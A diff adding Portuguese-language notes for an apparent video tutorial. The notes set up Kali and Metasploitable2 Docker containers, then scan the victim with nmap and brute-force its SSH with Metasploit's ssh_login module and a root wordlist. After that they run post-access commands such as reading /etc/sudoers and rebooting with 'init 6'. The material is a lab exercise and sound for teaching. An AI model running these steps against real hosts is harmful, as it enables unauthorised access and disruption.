@@ -1,0 +1,65 @@
+PS: CONHECIMENTO NÃO É CRIME
+
+Neste video iremos subir dois container`s Docker (um atacante outro vitima) usando Kali para atacar e metasploitable2 como vitima.
+
+####### Lembrando que este ambiente é totalmente controlado e não fere nenhuma lei. #######
+
+##################################################
+Comandos utilizados
+##################################################
+
+##### CONFIGURANDO AMBIENTE #####
+
+#Passo1 > Mostrar dockers
+#Passo2 > Mostrar Pull
+        - docker pull toolisticon/kalilinux
+        - docker pull tleemcjr/metasploitable2
+#Passo3 > Subir containers
+        - docker run -t -i -h makzumber toolisticon/kalilinux /bin/bash
+        - docker run -t -i -h makzumber tleemcjr/metasploitable2 /bin/bash
+#Passo4 > MAQUINA KALI < 172.17.0.4 >
+        - Atualizar repositorio
+            # apt-get update
+        - Instalar ping para teste de conexão 
+            # apt-get install iputils-ping
+        - Instalar telnet para estar porta 
+            # apt-get install telnet
+        - Verificar ip 
+            # ifconfig
+#Passo5 > MAQUINA VITIMA < 172.17.0.5 >
+        - Start no serviço do SSH
+           # /etc/init.d/ssh start
+        - Verificar IP 
+           # ifconfig
+        - Testar conectividade
+           # ping 172.17.0.4
+
+##### PREPARANDO ATAQUE #####
+MAQUINA KALI < 172.17.0.4 >
+
+#Passo6 > Encontrar vulnerabilidades
+                   # nmap -O -A -sV 172.17.0.5 
+#Passo7 > Verficar se a porta 22 está aberta
+                   # telnet 172.17.0.5 22       
+#Passo8 > Abrir metasploit
+                    # msfconsole      
+#Passo9 > Usar auxiliar  ssh_login
+            msf > use auxiliary/scanner/ssh/ssh_login
+#Passo10 > Setar verbose como verdadeira
+             msf > set VERBOSE true
+#Passo11 > Setar o uso da worlist que iremos usar
+             msf > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+#Passo12 > Setar qual é o Ip da vitima
+             msf > set RHOSTS 172.17.0.5
+#Passo13 > exploit
+##### BRUTE_FORCE SUCCESSFUL \_(ツ)_/
+#Passo14 > Habilitar sessão
+               msf > sessions -I 1
+#Passo15 > Usar a criatividade
+              whoami
+              pwd
+              cat /etc/sudoers
+              init 6
+E por ai vai, lembre-se que você é ROOT ... use com responsabilidade este poder. \o 
+
+Até a próxima... 
